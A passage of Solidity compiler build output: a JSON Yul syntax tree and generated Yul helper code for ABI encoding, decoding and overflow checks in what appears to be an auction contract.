ody":{"nativeSrc":"14471:16:10","nodeType":"YulBlock","src":"14471:16:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"14480:1:10","nodeType":"YulLiteral","src":"14480:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"14483:1:10","nodeType":"YulLiteral","src":"14483:1:10","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"14473:6:10","nodeType":"YulIdentifier","src":"14473:6:10"},"nativeSrc":"14473:12:10","nodeType":"YulFunctionCall","src":"14473:12:10"},"nativeSrc":"14473:12:10","nodeType":"YulExpressionStatement","src":"14473:12:10"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"14440:5:10","nodeType":"YulIdentifier","src":"14440:5:10"},{"arguments":[{"name":"value","nativeSrc":"14462:5:10","nodeType":"YulIdentifier","src":"14462:5:10"}],"functionName":{"name":"cleanup_t_bool","nativeSrc":"14447:14:10","nodeType":"YulIdentifier","src":"14447:14:10"},"nativeSrc":"14447:21:10","nodeType":"YulFunctionCall","src":"14447:21:10"}],"functionName":{"name":"eq","nativeSrc":"14437:2:10","nodeType":"YulIdentifier","src":"14437:2:10"},"nativeSrc":"14437:32:10","nodeType":"YulFunctionCall","src":"14437:32:10"}],"functionName":{"name":"iszero","nativeSrc":"14430:6:10","nodeType":"YulIdentifier","src":"14430:6:10"},"nativeSrc":"14430:40:10","nodeType":"YulFunctionCall","src":"14430:40:10"},"nativeSrc":"14427:60:10","nodeType":"YulIf","src":"14427:60:10"}]},"name":"validator_revert_t_bool","nativeSrc":"14377:116:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"14410:5:10","nodeType":"YulTypedName","src":"14410:5:10","type":""}],"src":"14377:116:10"},{"body":{"nativeSrc":"14559:77:10","nodeType":"YulBlock","src":"14559:77:10","statements":[{"nativeSrc":"14569:22:10","nodeType":"YulAssignment","src":"14569:22:10","value":{"arguments":[{"name":"offset","nativeSrc":"14584:6:10","nodeType":"YulIdentifier","src":"14584:6:10"}],"functionName":{"name":"mload","nativeSrc":"14578:5:10","nodeType":"YulIdentifier","src":"14578:5:10"},"nativeSrc":"14578:13:10","nodeType":"YulFunctionCall","src":"14578:13:10"},"variableNames":[{"name":"value","nativeSrc":"14569:5:10","nodeType":"YulIdentifier","src":"14569:5:10"}]},{"expression":{"arguments":[{"name":"value","nativeSrc":"14624:5:10","nodeType":"YulIdentifier","src":"14624:5:10"}],"functionName":{"name":"validator_revert_t_bool","nativeSrc":"14600:23:10","nodeType":"YulIdentifier","src":"14600:23:10"},"nativeSrc":"14600:30:10","nodeType":"YulFunctionCall","src":"14600:30:10"},"nativeSrc":"14600:30:10","nodeType":"YulExpressionStatement","src":"14600:30:10"}]},"name":"abi_decode_t_bool_fromMemory","nativeSrc":"14499:137:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nativeSrc":"14537:6:10","nodeType":"YulTypedName","src":"14537:6:10","type":""},{"name":"end","nativeSrc":"14545:3:10","nodeType":"YulTypedName","src":"14545:3:10","type":""}],"returnVariables":[{"name":"value","nativeSrc":"14553:5:10","nodeType":"YulTypedName","src":"14553:5:10","type":""}],"src":"14499:137:10"},{"body":{"nativeSrc":"14716:271:10","nodeType":"YulBlock","src":"14716:271:10","statements":[{"body":{"nativeSrc":"14762:83:10","nodeType":"YulBlock","src":"14762:83:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"14764:77:10","nodeType":"YulIdentifier","src":"14764:77:10"},"nativeSrc":"14764:79:10","nodeType":"YulFunctionCall","src":"14764:79:10"},"nativeSrc":"14764:79:10","nodeType":"YulExpressionStatement","src":"14764:79:10"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nativeSrc":"14737:7:10","nodeType":"YulIdentifier","src":"14737:7:10"},{"name":"headStart","nativeSrc":"14746:9:10","nodeType":"YulIdentifier","src":"14746:9:10"}],"functionName":{"name":"sub","nativeSrc":"14733:3:10","nodeType":"YulIdentifier","src":"14733:3:10"},"nativeSrc":"14733:23:10","nodeType":"YulFunctionCall","src":"14733:23:10"},{"kind":"number","nativeSrc":"14758:2:10","nodeType":"YulLiteral","src":"14758:2:10","type":"","value":"32"}],"functionName":{"name":"slt","nativeSrc":"14729:3:10","nodeType":"YulIdentifier","src":"14729:3:10"},"nativeSrc":"14729:32:10","nodeType":"YulFunctionCall","src":"14729:32:10"},"nativeSrc":"14726:119:10","nodeType":"YulIf","src":"14726:119:10"},{"nativeSrc":"14855:125:10","nodeType":"YulBlock","src":"14855:125:10","statements":[{"nativeSrc":"14870:15:10","nodeType":"YulVariableDeclaration","src":"14870:15:10","value":{"kind":"number","nativeSrc":"14884:1:10","nodeType":"YulLiteral","src":"14884:1:10","type":"","value":"0"},"variables":[{"name":"offset","nativeSrc":"14874:6:10","nodeType":"YulTypedName","src":"14874:6:10","type":""}]},{"nativeSrc":"14899:71:10","nodeType":"YulAssignment","src":"14899:71:10","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"14942:9:10","nodeType":"YulIdentifier","src":"14942:9:10"},{"name":"offset","nativeSrc":"14953:6:10","nodeType":"YulIdentifier","src":"14953:6:10"}],"functionName":{"name":"add","nativeSrc":"14938:3:10","nodeType":"YulIdentifier","src":"14938:3:10"},"nativeSrc":"14938:22:10","nodeType":"YulFunctionCall","src":"14938:22:10"},{"name":"dataEnd","nativeSrc":"14962:7:10","nodeType":"YulIdentifier","src":"14962:7:10"}],"functionName":{"name":"abi_decode_t_bool_fromMemory","nativeSrc":"14909:28:10","nodeType":"YulIdentifier","src":"14909:28:10"},"nativeSrc":"14909:61:10","nodeType":"YulFunctionCall","src":"14909:61:10"},"variableNames":[{"name":"value0","nativeSrc":"14899:6:10","nodeType":"YulIdentifier","src":"14899:6:10"}]}]}]},"name":"abi_decode_tuple_t_bool_fromMemory","nativeSrc":"14642:345:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"14686:9:10","nodeType":"YulTypedName","src":"14686:9:10","type":""},{"name":"dataEnd","nativeSrc":"14697:7:10","nodeType":"YulTypedName","src":"14697:7:10","type":""}],"returnVariables":[{"name":"value0","nativeSrc":"14709:6:10","nodeType":"YulTypedName","src":"14709:6:10","type":""}],"src":"14642:345:10"},{"body":{"nativeSrc":"15147:288:10","nodeType":"YulBlock","src":"15147:288:10","statements":[{"nativeSrc":"15157:26:10","nodeType":"YulAssignment","src":"15157:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"15169:9:10","nodeType":"YulIdentifier","src":"15169:9:10"},{"kind":"number","nativeSrc":"15180:2:10","nodeType":"YulLiteral","src":"15180:2:10","type":"","value":"96"}],"functionName":{"name":"add","nativeSrc":"15165:3:10","nodeType":"YulIdentifier","src":"15165:3:10"},"nativeSrc":"15165:18:10","nodeType":"YulFunctionCall","src":"15165:18:10"},"variableNames":[{"name":"tail","nativeSrc":"15157:4:10","nodeType":"YulIdentifier","src":"15157:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"15237:6:10","nodeType":"YulIdentifier","src":"15237:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"15250:9:10","nodeType":"YulIdentifier","src":"15250:9:10"},{"kind":"number","nativeSrc":"15261:1:10","nodeType":"YulLiteral","src":"15261:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"15246:3:10","nodeType":"YulIdentifier","src":"15246:3:10"},"nativeSrc":"15246:17:10","nodeType":"YulFunctionCall","src":"15246:17:10"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"15193:43:10","nodeType":"YulIdentifier","src":"15193:43:10"},"nativeSrc":"15193:71:10","nodeType":"YulFunctionCall","src":"15193:71:10"},"nativeSrc":"15193:71:10","nodeType":"YulExpressionStatement","src":"15193:71:10"},{"expression":{"arguments":[{"name":"value1","nativeSrc":"15318:6:10","nodeType":"YulIdentifier","src":"15318:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"15331:9:10","nodeType":"YulIdentifier","src":"15331:9:10"},{"kind":"number","nativeSrc":"15342:2:10","nodeType":"YulLiteral","src":"15342:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"15327:3:10","nodeType":"YulIdentifier","src":"15327:3:10"},"nativeSrc":"15327:18:10","nodeType":"YulFunctionCall","src":"15327:18:10"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"15274:43:10","nodeType":"YulIdentifier","src":"15274:43:10"},"nativeSrc":"15274:72:10","nodeType":"YulFunctionCall","src":"15274:72:10"},"nativeSrc":"15274:72:10","nodeType":"YulExpressionStatement","src":"15274:72:10"},{"expression":{"arguments":[{"name":"value2","nativeSrc":"15400:6:10","nodeType":"YulIdentifier","src":"15400:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"15413:9:10","nodeType":"YulIdentifier","src":"15413:9:10"},{"kind":"number","nativeSrc":"15424:2:10","nodeType":"YulLiteral","src":"15424:2:10","type":"","value":"64"}],"functionName":{"name":"add","nativeSrc":"15409:3:10","nodeType":"YulIdentifier","src":"15409:3:10"},"nativeSrc":"15409:18:10","nodeType":"YulFunctionCall","src":"15409:18:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"15356:43:10","nodeType":"YulIdentifier","src":"15356:43:10"},"nativeSrc":"15356:72:10","nodeType":"YulFunctionCall","src":"15356:72:10"},"nativeSrc":"15356:72:10","nodeType":"YulExpressionStatement","src":"15356:72:10"}]},"name":"abi_encode_tuple_t_address_t_address_t_uint256__to_t_address_t_address_t_uint256__fromStack_reversed","nativeSrc":"14993:442:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"15103:9:10","nodeType":"YulTypedName","src":"15103:9:10","type":""},{"name":"value2","nativeSrc":"15115:6:10","nodeType":"YulTypedName","src":"15115:6:10","type":""},{"name":"value1","nativeSrc":"15123:6:10","nodeType":"YulTypedName","src":"15123:6:10","type":""},{"name":"value0","nativeSrc":"15131:6:10","nodeType":"YulTypedName","src":"15131:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"15142:4:10","nodeType":"YulTypedName","src":"15142:4:10","type":""}],"src":"14993:442:10"},{"body":{"nativeSrc":"15595:288:10","nodeType":"YulBlock","src":"15595:288:10","statements":[{"nativeSrc":"15605:26:10","nodeType":"YulAssignment","src":"15605:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"15617:9:10","nodeType":"YulIdentifier","src":"15617:9:10"},{"kind":"number","nativeSrc":"15628:2:10","nodeType":"YulLiteral","src":"15628:2:10","type":"","value":"96"}],"functionName":{"name":"add","nativeSrc":"15613:3:10","nodeType":"YulIdentifier","src":"15613:3:10"},"nativeSrc":"15613:18:10","nodeType":"YulFunctionCall","src":"15613:18:10"},"variableNames":[{"name":"tail","nativeSrc":"15605:4:10","nodeType":"YulIdentifier","src":"15605:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"15685:6:10","nodeType":"YulIdentifier","src":"15685:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"15698:9:10","nodeType":"YulIdentifier","src":"15698:9:10"},{"kind":"number","nativeSrc":"15709:1:10","nodeType":"YulLiteral","src":"15709:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"15694:3:10","nodeType":"YulIdentifier","src":"15694:3:10"},"nativeSrc":"15694:17:10","nodeType":"YulFunctionCall","src":"15694:17:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"15641:43:10","nodeType":"YulIdentifier","src":"15641:43:10"},"nativeSrc":"15641:71:10","nodeType":"YulFunctionCall","src":"15641:71:10"},"nativeSrc":"15641:71:10","nodeType":"YulExpressionStatement","src":"15641:71:10"},{"expression":{"arguments":[{"name":"value1","nativeSrc":"15766:6:10","nodeType":"YulIdentifier","src":"15766:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"15779:9:10","nodeType":"YulIdentifier","src":"15779:9:10"},{"kind":"number","nativeSrc":"15790:2:10","nodeType":"YulLiteral","src":"15790:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"15775:3:10","nodeType":"YulIdentifier","src":"15775:3:10"},"nativeSrc":"15775:18:10","nodeType":"YulFunctionCall","src":"15775:18:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"15722:43:10","nodeType":"YulIdentifier","src":"15722:43:10"},"nativeSrc":"15722:72:10","nodeType":"YulFunctionCall","src":"15722:72:10"},"nativeSrc":"15722:72:10","nodeType":"YulExpressionStatement","src":"15722:72:10"},{"expression":{"arguments":[{"name":"value2","nativeSrc":"15848:6:10","nodeType":"YulIdentifier","src":"15848:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"15861:9:10","nodeType":"YulIdentifier","src":"15861:9:10"},{"kind":"number","nativeSrc":"15872:2:10","nodeType":"YulLiteral","src":"15872:2:10","type":"","value":"64"}],"functionName":{"name":"add","nativeSrc":"15857:3:10","nodeType":"YulIdentifier","src":"15857:3:10"},"nativeSrc":"15857:18:10","nodeType":"YulFunctionCall","src":"15857:18:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"15804:43:10","nodeType":"YulIdentifier","src":"15804:43:10"},"nativeSrc":"15804:72:10","nodeType":"YulFunctionCall","src":"15804:72:10"},"nativeSrc":"15804:72:10","nodeType":"YulExpressionStatement","src":"15804:72:10"}]},"name":"abi_encode_tuple_t_uint256_t_uint256_t_uint256__to_t_uint256_t_uint256_t_uint256__fromStack_reversed","nativeSrc":"15441:442:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"15551:9:10","nodeType":"YulTypedName","src":"15551:9:10","type":""},{"name":"value2","nativeSrc":"15563:6:10","nodeType":"YulTypedName","src":"15563:6:10","type":""},{"name":"value1","nativeSrc":"15571:6:10","nodeType":"YulTypedName","src":"15571:6:10","type":""},{"name":"value0","nativeSrc":"15579:6:10","nodeType":"YulTypedName","src":"15579:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"15590:4:10","nodeType":"YulTypedName","src":"15590:4:10","type":""}],"src":"15441:442:10"}]},"contents":"{\n\n    function panic_error_0x21() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x21)\n        revert(0, 0x24)\n    }\n\n    function validator_assert_t_enum$_AuctionState_$1057(value) {\n        if iszero(lt(value, 2)) { panic_error_0x21() }\n    }\n\n    function cleanup_t_enum$_AuctionState_$1057(value) -> cleaned {\n        cleaned := value validator_assert_t_enum$_AuctionState_$1057(value)\n    }\n\n    function convert_t_enum$_AuctionState_$1057_to_t_uint8(value) -> converted {\n        converted := cleanup_t_enum$_AuctionState_$1057(value)\n    }\n\n    function abi_encode_t_enum$_AuctionState_$1057_to_t_uint8_fromStack(value, pos) {\n        mstore(pos, convert_t_enum$_AuctionState_$1057_to_t_uint8(value))\n    }\n\n    function abi_encode_tuple_t_enum$_AuctionState_$1057__to_t_uint8__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_enum$_AuctionState_$1057_to_t_uint8_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function cleanup_t_int256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function abi_encode_t_int256_to_t_int256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_int256(value))\n    }\n\n    function abi_encode_tuple_t_int256__to_t_int256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_int256_to_t_int256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function validator_revert_t_uint256(value) {\n        if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_uint256(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_uint256(value)\n    }\n\n    function abi_decode_tuple_t_uint256(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_tuple_t_uint256_t_address_t_uint256_t_uint256_t_uint256_t_bool__to_t_uint256_t_address_t_uint256_t_uint256_t_uint256_t_bool__fromStack_reversed(headStart , value5, value4, value3, value2, value1, value0) -> tail {\n        tail := add(headStart, 192)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_address_to_t_address_fromStack(value1,  add(headStart, 32))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value2,  add(headStart, 64))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value3,  add(headStart, 96))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value4,  add(headStart, 128))\n\n        abi_encode_t_bool_to_t_bool_fromStack(value5,  add(headStart, 160))\n\n    }\n\n    function abi_decode_tuple_t_uint256t_uint256(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {\n        updated_pos := pos\n    }\n\n    function store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(memPtr) {\n\n    }\n\n    function abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, 0)\n        store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(pos)\n        end := add(pos, 0)\n    }\n\n    function abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos ) -> end {\n\n        pos := abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack( pos)\n\n        end := pos\n    }\n\n    function abi_encode_tuple_t_address_t_uint256_t_uint256__to_t_address_t_uint256_t_uint256__fromStack_reversed(headStart , value2, value1, value0) -> tail {\n        tail := add(headStart, 96)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value1,  add(headStart, 32))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value2,  add(headStart, 64))\n\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function increment_t_uint256(value) -> ret {\n        value := cleanup_t_uint256(value)\n        if eq(value, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) { panic_error_0x11() }\n        ret := add(value, 1)\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function store_literal_in_memory_71c3a965e4da9bf4528a6b0a2f1da81500b833e1f3c621d8ceef48fb5c7dba9a(memPtr) {\n\n        mstore(add(memPtr, 0), \"bidValue less than 0\")\n\n    }\n\n    function abi_encode_t_stringliteral_71c3a965e4da9bf4528a6b0a2f1da81500b833e1f3c621d8ceef48fb5c7dba9a_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 20)\n        store_literal_in_memory_71c3a965e4da9bf4528a6b0a2f1da81500b833e1f3c621d8ceef48fb5c7dba9a(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_tuple_t_stringliteral_71c3a965e4da9bf4528a6b0a2f1da81500b833e1f3c621d8ceef48fb5c7dba9a__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_71c3a965e4da9bf4528a6b0a2f1da81500b833e1f3c621d8ceef48fb5c7dba9a_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        diff := sub(x, y)\n\n        if gt(diff, x) { panic_error_0x11() }\n\n    }\n\n    function store_literal_in_memory_9dd4894e5023a0e17c1d4a44cc5b0d7f47c7a4c69448e00312c60be60cf75bfb(memPtr) {\n\n        mstore(add(memPtr, 0), \"time is up\")\n\n    }\n\n    function abi_encode_t_stringliteral_9dd4894e5023a0e17c1d4a44cc5b0d7f47c7a4c69448e00312c60be60cf75bfb_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 10)\n        store_literal_in_memory_9dd4894e5023a0e17c1d4a44cc5b0d7f47c7a4c69448e00312c60be60cf75bfb(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_tuple_t_stringliteral_9dd4894e5023a0e17c1d4a44cc5b0d7f47c7a4c69448e00312c60be60cf75bfb__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_9dd4894e5023a0e17c1d4a44cc5b0d7f47c7a4c69448e00312c60be60cf75bfb_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function store_literal_in_memory_db1bb1de83edabd500c0014fce354e49c1de3e4c849d352fedfbf22c6445e5c3(memPtr) {\n\n        mstore(add(memPtr, 0), \"There is no more algos left\")\n\n    }\n\n    function abi_encode_t_stringliteral_db1bb1de83edabd500c0014fce354e49c1de3e4c849d352fedfbf22c6445e5c3_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 27)\n        store_literal_in_memory_db1bb1de83edabd500c0014fce354e49c1de3e4c849d352fedfbf22c6445e5c3(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_tuple_t_stringliteral_db1bb1de83edabd500c0014fce354e49c1de3e4c849d352fedfbf22c6445e5c3__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_db1bb1de83edabd500c0014fce354e49c1de3e4c849d352fedfbf22c6445e5c3_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_uint256_t_address_t_uint256__to_t_uint256_t_address_t_uint256__fromStack_reversed(headStart , value2, value1, value0) -> tail {\n        tail := add(headStart, 96)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_address_to_t_address_fromStack(value1,  add(headStart, 32))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value2,  add(headStart, 64))\n\n    }\n\n    function abi_decode_t_uint256_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_uint256(value)\n    }\n\n    function abi_decode_tuple_t_uint256_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_uint256_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_tuple_t_uint256_t_address__to_t_uint256_t_address__fromStack_reversed(headStart , value1, value0) -> tail {\n        tail := add(headStart, 64)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_address_to_t_address_fromStack(value1,  add(headStart, 32))\n\n    }\n\n    function abi_encode_tuple_t_uint256_t_address_t_uint256_t_uint256__to_t_uint256_t_address_t_uint256_t_uint256__fromStack_reversed(headStart , value3, value2, value1, value0) -> tail {\n        tail := add(headStart, 128)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_address_to_t_address_fromStack(value1,  add(headStart, 32))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value2,  add(headStart, 64))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value3,  add(headStart, 96))\n\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n    function checked_mul_t_int256(x, y) -> product {\n        x := cleanup_t_int256(x)\n        y := cleanup_t_int256(y)\n        let product_raw := mul(x, y)\n        product := cleanup_t_int256(product_raw)\n\n        // special case\n        if and(slt(x, 0), eq(y, 0x8000000000000000000000000000000000000000000000000000000000000000)) { panic_error_0x11() }\n\n        // overflow, if x != 0 and y != product/x\n        if iszero(\n            or(\n                iszero(x),\n                eq(y, sdiv(product, x))\n            )\n        ) { panic_error_0x11() }\n\n    }\n\n    function checked_sub_t_int256(x, y) -> diff {\n        x := cleanup_t_int256(x)\n        y := cleanup_t_int256(y)\n        diff := sub(x, y)\n\n        // underflow, if y >= 0 and diff > x\n        // overflow, if y < 0 and diff < x\n        if or(\n            and(iszero(slt(y, 0)), sgt(diff, x)),\n            and(slt(y, 0), slt(diff, x))\n        ) { panic_error_0x11() }\n\n    }\n\n    function abi_encode_tuple_t_uint256_t_uint256__to_t_uint256_t_uint256__fromStack_reversed(headStart , value1, value0) -> tail {\n        tail := add(headStart, 64)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value1,  add(headStart, 32))\n\n    }\n\n    function checked_mul_t_uint256(x, y) -> product {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        let product_raw := mul(x, y)\n        product := cleanup_t_uint256(product_raw)\n\n        // overflow, if x != 0 and y != product/x\n        if iszero(\n            or(\n                iszero(x),\n                eq(y, div(product, x))\n            )\n        ) { panic_error_0x11() }\n\n    }\n\n    function abi_encode_tuple_t_address_t_uint256__to_t_address_t_uint256__fromStack_reversed(headStart , value1, value0) -> tail {\n        tail := add(headStart, 64)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value1,  add(headStart, 32))\n\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_bool_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_tuple_t_address_t_address_t_uint256__to_t_address_t_address_t_uint256__fromStack_reversed(headStart , value2, value1, value0) -> tail {\n        tail := add(headStart, 